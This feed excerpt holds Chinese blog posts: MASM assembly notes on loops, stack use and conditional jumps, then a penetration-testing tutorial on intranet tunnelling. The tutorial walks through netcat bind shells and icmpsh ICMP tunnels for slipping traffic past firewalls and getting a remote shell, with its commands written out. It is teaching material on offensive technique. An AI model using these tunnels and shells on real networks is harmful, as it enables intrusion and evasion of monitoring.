<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">while</span> condition</pre></td></tr><tr><td data-num="2"></td><td><pre>    statements</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>endw</pre></td></tr></table></figure><p><strong>使用样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">while</span><span class="token expression">语法使用</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>mov eax<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">while</span> eax <span class="token operator">&lt;</span> <span class="token number">10</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	inc eax</pre></td></tr><tr><td data-num="5"></td><td><pre>	call WriteDec</pre></td></tr><tr><td data-num="6"></td><td><pre>	call Crlf</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>endw</pre></td></tr></table></figure><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">do</span> <span class="token expression"><span class="token keyword">while</span>语法使用</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>mov eax<span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>repeat</pre></td></tr><tr><td data-num="4"></td><td><pre>	inc eax</pre></td></tr><tr><td data-num="5"></td><td><pre>	call WriteDec</pre></td></tr><tr><td data-num="6"></td><td><pre>	call Crlf</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>until eax <span class="token operator">==</span> <span class="token number">10</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之条件跳转指令JCC与条件循环指令LOOP学习</title>
    <url>/article/b33bdacd.html</url>
    <content><![CDATA[<p>在学习条件跳转指令之前，插入一个堆栈学习的测试样例。</p>
<p><strong>堆栈操作之逆序输出</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>source byte <span class="token string">"My name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre>sourcesize <span class="token operator">=</span> <span class="token punctuation">(</span>$ <span class="token operator">-</span> source<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="20"></td><td><pre>main proc</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov ecx<span class="token punctuation">,</span>sourcesize</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov esi<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	movzx eax<span class="token punctuation">,</span>source<span class="token punctuation">[</span>esi<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	push eax</pre></td></tr><tr><td data-num="26"></td><td><pre>	inc esi</pre></td></tr><tr><td data-num="27"></td><td><pre>	loop lp</pre></td></tr><tr><td data-num="28"></td><td><pre>	mov ecx<span class="token punctuation">,</span>sourcesize</pre></td></tr><tr><td data-num="29"></td><td><pre>	mov esi<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="30"></td><td><pre>lq<span class="token operator">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	pop eax</pre></td></tr><tr><td data-num="32"></td><td><pre>	mov source<span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">,</span>al</pre></td></tr><tr><td data-num="33"></td><td><pre>	inc esi</pre></td></tr><tr><td data-num="34"></td><td><pre>	loop lq</pre></td></tr><tr><td data-num="35"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="37"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="38"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="39"></td><td><pre>END main</pre></td></tr></table></figure><p>测试代码运行结果，可以看到成功将字符串逆序输出了。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220125184659002.png" alt="image-20220125184659002" /></p>
<h2 id="条件跳转指令jcc"><a class="anchor" href="#条件跳转指令jcc">#</a> 条件跳转指令 JCC</h2>
<p>JCC 指条件跳转指令，CC 就是指条件码。</p>
<table>
<thead>
<tr>
<th>JCC 指令</th>
<th>中文含义</th>
<th>英文原意</th>
<th>检查符号位</th>
<th>典型 C 应用</th>
</tr>
</thead>
<tbody>
<tr>
<td>JZ/JE</td>
<td>若为 0 则跳转；若相等则跳转；</td>
<td>jump if zero;jump if equal</td>
<td>ZF=1</td>
<td>if (i == j);if (i == 0);</td>
</tr>
<tr>
<td>JNZ/JNE</td>
<td>若不为 0 则跳转；若不相等则跳转；</td>
<td>jump if not zero;jump if not equal</td>
<td>ZF=0</td>
<td>if (i != j);if (i != 0);</td>
</tr>
<tr>
<td>JS</td>
<td>若为负则跳转；</td>
<td>jump if sign</td>
<td>SF=1</td>
<td>if (i &lt; 0);</td>
</tr>
<tr>
<td>JNS</td>
<td>若为正则跳转；</td>
<td>jump if not sign</td>
<td>SF=0</td>
<td>if (i &gt; 0);</td>
</tr>
<tr>
<td>JP/JPE</td>
<td>若 1 出现次数为偶数则跳转；</td>
<td>jump if Parity (Even)</td>
<td>PF=1</td>
<td>(null)</td>
</tr>
<tr>
<td>JNP/JPO</td>
<td>若 1 出现次数为奇数则跳转；</td>
<td>jump if not parity (odd)</td>
<td>PF=0</td>
<td>(null)</td>
</tr>
<tr>
<td>JO</td>
<td>若溢出则跳转；</td>
<td>jump if overflow</td>
<td>OF=1</td>
<td>(null)</td>
</tr>
<tr>
<td>JNO</td>
<td>若无溢出则跳转；</td>
<td>jump if not overflow</td>
<td>OF=0</td>
<td>(null)</td>
</tr>
<tr>
<td>JC/JB/JNAE</td>
<td>若进位则跳转；若低于则跳转；若不高于等于则跳转；</td>
<td>jump if carry;jump if below;jump if not above equal</td>
<td>CF=1</td>
<td>if (i &lt; j);</td>
</tr>
<tr>
<td>JNC/JNB/JAE</td>
<td>若无进位则跳转；若不低于则跳转；若高于等于则跳转；</td>
<td>jump if not carry;jump if not below;jump if above equal</td>
<td>CF=0</td>
<td>if (i &gt;= j);</td>
</tr>
<tr>
<td>JBE/JNA</td>
<td>若低于等于则跳转；若不高于则跳转；</td>
<td>jump if below equal;jump if not above</td>
<td>ZF=1 或 CF=1</td>
<td>if (i &lt;= j);</td>
</tr>
<tr>
<td>JNBE/JA</td>
<td>若不低于等于则跳转；若高于则跳转；</td>
<td>jump if not below equal;jump if above</td>
<td>ZF=0 或 CF=0</td>
<td>if (i &gt; j);</td>
</tr>
<tr>
<td>JL/JNGE</td>
<td>若小于则跳转；若不大于等于则跳转；</td>
<td>jump if less;jump if not greater equal</td>
<td>SF != OF</td>
<td>if (si &lt; sj);</td>
</tr>
<tr>
<td>JNL/JGE</td>
<td>若不小于则跳转；若大于等于则跳转；</td>
<td>jump if not less;jump if greater equal</td>
<td>SF = OF</td>
<td>if (si &gt;= sj);</td>
</tr>
<tr>
<td>JLE/JNG</td>
<td>若小于等于则跳转；若不大于则跳转；</td>
<td>jump if less equal;jump if not greater</td>
<td>ZF != OF 或 ZF=1</td>
<td>if (si &lt;= sj);</td>
</tr>
<tr>
<td>JNLE/JG</td>
<td>若不小于等于则跳转；若大于则跳转；</td>
<td>jump if not less equal;jump if greater</td>
<td>SF=0F 且 ZF=0</td>
<td>if(si&gt;sj);</td>
</tr>
</tbody>
</table>
<h3 id="je指令学习测试"><a class="anchor" href="#je指令学习测试">#</a> JE 指令学习测试</h3>
<p>根据 je 指令的特性 &quot;若为 0 则跳转；若相等则跳转&quot;，也就是说若前面赋值的 eax 与后一个数进行比较之后，通过 je 指令测试，若相等就进行跳转</p>
<h5 id="测试样例"><a class="anchor" href="#测试样例">#</a> 测试样例</h5>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">250</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	cmp eax<span class="token punctuation">,</span><span class="token number">250</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	je lp</pre></td></tr><tr><td data-num="22"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="24"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="25"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="26"></td><td><pre>END main</pre></td></tr></table></figure><h5 id="断点测试"><a class="anchor" href="#断点测试">#</a> 断点测试</h5>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127200800894.png" alt="image-20220127200800894" /></p>
<p>可以发现 eax 的值变成了 FA 也就是 250</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127200832474.png" alt="image-20220127200832474" /></p>
<p>再次运行可以发现 je 实现跳转，一直测试一直跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127201050380.png" alt="image-20220127201050380" /></p>
<p>测试当 eax 值不等的情况下是否进行跳转，给 eax 赋值为 251</p>
<p>进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127202159243.png" alt="image-20220127202159243" /></p>
<p>当进行后 eax 的值变为 FB，也就是 251</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127202307848.png" alt="image-20220127202307848" /></p>
<p>进行测试后发现，直接进行下一步并没有实现跳转，由此可以发现 je 的跳转条件。</p>
<p>其它指令的作用效果皆可通过测试发现，也可通过金手指查看其它指令作用</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127202632987.png" alt="image-20220127202632987" /></p>
<h2 id="条件循环指令loop"><a class="anchor" href="#条件循环指令loop">#</a> 条件循环指令 LOOP</h2>
<p>通过之前的学习，我们知道 loop 指令循环的基本条件是 <code>ecx &gt; 0</code></p>
<h3 id="loop指令学习测试"><a class="anchor" href="#loop指令学习测试">#</a> LOOP 指令学习测试</h3>
<h4 id="测试样例-2"><a class="anchor" href="#测试样例-2">#</a> 测试样例</h4>
<p>通过 loop 指令使 eax 自增 10 次</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov ecx<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">;</span>循环计数器，每执行一次ecx <span class="token operator">-</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="20"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	inc eax</pre></td></tr><tr><td data-num="22"></td><td><pre>	loop lp</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><h4 id="断点测试-2"><a class="anchor" href="#断点测试-2">#</a> 断点测试</h4>
<p>可以看到初始值均为 0</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204201234.png" alt="image-20220127204201234" /></p>
<p>执行一次后 eax = 1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204228389.png" alt="image-20220127204228389" /></p>
<p>ecx 的值由 10 变成了 9</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204251076.png" alt="image-20220127204251076" /></p>
<p>执行第二次，eax = 2</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204345379.png" alt="image-20220127204345379" /></p>
<p>而 ecx 变成了 8</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204409268.png" alt="image-20220127204409268" /></p>
<p>如此直至 ecx=0 结束</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204442469.png" alt="image-20220127204442469" /></p>
<h3 id="loopz指令学习"><a class="anchor" href="#loopz指令学习">#</a> loopz 指令学习</h3>
<p>loopz 的跳转条件 <code>ecx &gt; 0 &amp;&amp; zf = 1</code></p>
<p>使用 loopz 后测试可以看到 zf 位的值为 1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204931747.png" alt="image-20220127204931747" /></p>
<p>测试之后发现 ZR = 0 后</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205042744.png" alt="image-20220127205042744" /></p>
<p>并没有实现跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205114152.png" alt="image-20220127205114152" /></p>
<p>给 eax 赋值为 1 进行测试，并让 eax 自减</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205255261.png" alt="image-20220127205255261" /></p>
<p>第一次执行 eax 自减为 0，而 ZR = 1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205340317.png" alt="image-20220127205340317" /></p>
<p>成功实现跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205405729.png" alt="image-20220127205405729" /></p>
<p>第二次执行 ZR = 0</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205437074.png" alt="image-20220127205437074" /></p>
<p>并未实现跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205459990.png" alt="image-20220127205459990" /></p>
<h3 id="loopnz指令学习"><a class="anchor" href="#loopnz指令学习">#</a> loopnz 指令学习</h3>
<p><strong>n = not</strong></p>
<p>loopnz 的跳转条件 <code>ecx &gt; 0 &amp;&amp; zf = 0</code> ，即等于 0 进行跳转，等于 1 不进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205919545.png" alt="image-20220127205919545" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205931779.png" alt="image-20220127205931779" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205948743.png" alt="image-20220127205948743" /></p>
<p>将 dec 改为 inc，并将 eax 赋值为 0 进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127210233083.png" alt="image-20220127210233083" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127210250862.png" alt="image-20220127210250862" /></p>
<p>实现跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127210309969.png" alt="image-20220127210309969" /></p>
<h3 id="loope与loopne指令学习"><a class="anchor" href="#loope与loopne指令学习">#</a> loope 与 loopne 指令学习</h3>
<p>loope 与 loopz 不同的是，loope 以 cmp 为跳转条件，而 loopz 以加减法为跳转条件</p>
<p>即 loope 是以其操作数的比较值作为跳转条件的，若操作数相等，其结果为 0 进行跳转</p>
]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈内网渗透中有关隧道的那些事儿</title>
    <url>/article/cdbe6e7b.html</url>
    <content><![CDATA[<h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2>
<p>近一个月来，忙着期末复习内网的学习也就暂停了一段时间，所幸这几天考完了。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102181746.jpg" alt="image-20220102181746" /></p>
<p>这边我们回顾一下之前学习内网的相关知识的时候，发现内网的攻防更多的是流量的出入，也就是，所谓的内网安全的大基础是让内网的主机流量能够出入，不被发现，在内网中一般是会存在相关的检测设备的，普通的数据流量很容易就被检测出来。</p>
<p>在渗透测试中，进入内网后，要判断流量是否能够出的去、进的来。隐藏通信隧道的情况一般常用于在访问受限的的网络环境中追踪数据流向和在非受信任网络环境找那个实现安全的数据传输。</p>
<h2 id="一-什么是隧道"><a class="anchor" href="#一-什么是隧道">#</a> 一、什么是隧道？</h2>
<p>一般的网络通信流程是：在两台主机上建立 TCP 链接，然后进行正常的数据通信，在知道 IP 地址的情况下，可以直接发送报文，如果不知道 IP 地址的话，就需要将域名解析为 IP 地址。在实际的网络情况下，流量会经过很多的边界设备，在一般的企业内网中，可能会存在 IDP、IPS、防火墙等设备，如果异常的话，就会直接将通信阻断；这里我们说的隧道，就是绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方通信。当被封装的数据包达到了另外的地址的时候，解包还原，并将还原后的数据包发送到相应的服务器上。</p>
<p><strong>常见的隧道包括三个大类：网络层、应用层、传输层</strong></p>
<h4 id="隧道"><a class="anchor" href="#隧道">#</a> <strong>隧道</strong></h4>
<p>判断内网的连通性是指判断机器是否上外网等，要综合判断各种协议（ <code>TCP</code> 、 <code>HTTP</code> 、 <code>DNS</code> 、 <code>ICMP</code> 、等）及端口的通信情况，常见的流量出口端口有： <code>80</code> 、 <code>8080</code> 、 <code>443</code> 、 <code>53</code> 、 <code>110</code> 、 <code>123</code>  等。常见的内网连通性判断如下：</p>
<ul>
<li>ICMP 协议 就是我们常说的 ping 命令，ping 命令使用的就是 ICMP 协议。语法为：ping &lt;域名或 IP&gt;</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102182234399.png" alt="image-20220102182234399" /></p>
<h4 id="tcp协议"><a class="anchor" href="#tcp协议">#</a> <strong>TCP 协议：</strong></h4>
<p>netcat 简称（NC），被称为网络界的瑞士军刀，小巧但是功能强大，通过使用 TCP 或者 UDP 进行网络连接进行通信，他是一个 CS 结构的服务，需要在服务器监听，然后客户端连接，基本使用如下：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ldGVybmFsbHlib3JlZC5vcmcvbWlzYy9uZXRjYXQv">网络测试工具 NETCAT 官方下载</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/f74ae9614bc4a2d3bdc2ea38747d8afc.png" alt="img" /></p>
<p>服务端：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102182846922.png" alt="image-20220102182846922" /></p>
<p>将自己的 CMD 放在 80 端口，并且等待连接，-lvp 分别表示，监听、输出版本信息、持久化。客户端连接成功后，就可以执行 CMD 的命令。</p>
<p>然后在客户端连接，可以执行命令：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102183221947.png" alt="image-20220102183221947" /></p>
<h4 id="http协议"><a class="anchor" href="#http协议">#</a> <strong>HTTP 协议</strong></h4>
<p>curl 是一个可以利用 URl 规则在命令行下工作的综合文件传输工具，支持文件的上传和下载，curl 命令不仅支持 HTTP、HTTPS、FTP 等多种协议，还支持 POST、Cookie、认证、从指定的位置下载文件。在 Liunx 环境下是有 curl 的环境的，windows 下 powershell 自带 curl，否则需要下载，这里我在 liunx 中测试：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102183453497.png" alt="image-20220102183453497" /></p>
<p>在 powershell 中测试：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102184030185.png" alt="image-20220102184030185" /></p>
<h4 id="dns协议"><a class="anchor" href="#dns协议">#</a> DNS 协议</h4>
<p>在进行 DNS 连通性测试的时候，常用的命令为 nslookup 和 dig</p>
<p>nslookup 是 windows 自带的 DNS 探测命令，在没有指定 IP 的时候，会从系统网络中的 TCP/IP 的协议中读取 DNS 地址。：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102184348822.png" alt="image-20220102184348822" /></p>
<p><strong>网络层隧道技术</strong></p>
<p>在网络层，两个常用的隧道协议是 IPv6 和 ICMP</p>
<h2 id="二-icmp隧道"><a class="anchor" href="#二-icmp隧道">#</a> 二、ICMP 隧道</h2>
<p>​    ICMP 隧道简单实用，不需要开放端口就可以进行通信。常见命令是 ping 命令，在一般情况下，每一个 ping 命令都会回复消息</p>
<p>在一些网络环境中，在使用一些上层隧道都失效以后（例如 HTTP 隧道之类的），常常会使用 ping 命令访问远程的计算机，使用 ICMP 可以使用将包封装在 ICMP 中，从而穿过防火墙达到目标，而不受网络限制，需要客户端和服务端都能够使用 ICMP 协议</p>
<p>常用的 ICMP 隧道工具有：icmpsh、Pingtunnel、powershell icmp</p>
<p>icmpsh</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>echo <span class="token number">0</span> <span class="token operator">></span><span class="token operator">/</span>proc<span class="token operator">/</span>sys<span class="token operator">/</span>net<span class="token operator">/</span>ipv4<span class="token operator">/</span>icmp_echo_ignore_all  <span class="token comment"># 临时允许 ICMP</span></pre></td></tr></table></figure><p>icmpsh 工具使用简单，便携的跨平台工具，并且使用的时候不需要管理员权限，使用的环境是在 windows 上，使用 ICMP 还能够进行流量的隐藏</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lucXVpc2IvaWNtcHNo">项目地址</span></p>
<p>受控端直接下载（这里是在本地环境，真实环境上传 ipcmpsh.exe 就好）：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102184609494.png" alt="image-20220102184609494" /></p>
<p>服务端下载：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102185120824.png" alt="image-20220102185120824" /></p>
<p>然后关闭服务端的 ICMP 应答：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>sysctl <span class="token operator">-</span>w net<span class="token punctuation">.</span>ipv4<span class="token punctuation">.</span>icmp_echo_ignore_all<span class="token operator">=</span><span class="token number">1</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102185258877.png" alt="image-20220102185258877" /></p>
<p>配置环境：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>yum <span class="token operator">-</span>y install epel<span class="token operator">-</span>release</pre></td></tr><tr><td data-num="2"></td><td><pre>yum <span class="token operator">-</span>y install python<span class="token operator">-</span>pip</pre></td></tr><tr><td data-num="3"></td><td><pre>pip install <span class="token operator">-</span><span class="token operator">-</span>upgrade pip <span class="token operator">-</span>i https<span class="token punctuation">:</span><span class="token operator">//</span>pypi<span class="token punctuation">.</span>tuna<span class="token punctuation">.</span>tsinghua<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>simple</pre></td></tr><tr><td data-num="4"></td><td><pre>pip install Impacket <span class="token operator">-</span>i https<span class="token punctuation">:</span><span class="token operator">//</span>pypi<span class="token punctuation">.</span>tuna<span class="token punctuation">.</span>tsinghua<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>simple</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102185443519.png" alt="image-20220102185443519" /></p>
<p>服务端启动：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python icmpsh_m<span class="token punctuation">.</span>py <span class="token operator">&lt;</span>vpsIP<span class="token operator">></span> <span class="token operator">&lt;</span>受控端IP<span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102185740055.png" alt="image-20220102185740055" /></p>
<p>客户端连接：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102184913449.png" alt="image-20220102184913449" /></p>
<p>当我们运行以后，就可以得到一个 shell.</p>
<p><strong>传输层隧道技术</strong></p>
<pre><code>传输层数据隧道包括TCP隧道、UDP隧道、和常规的端口转发。在内网渗透中，如果防火墙对某些端口进行了限制的话，在获得目标权限以后可以打开需要的端口，要是内网中存在大量的防护设备的话，TCP、UDP流量会大量拦截。
</code></pre>
<h4 id="netcat使用"><a class="anchor" href="#netcat使用">#</a> Netcat 使用</h4>
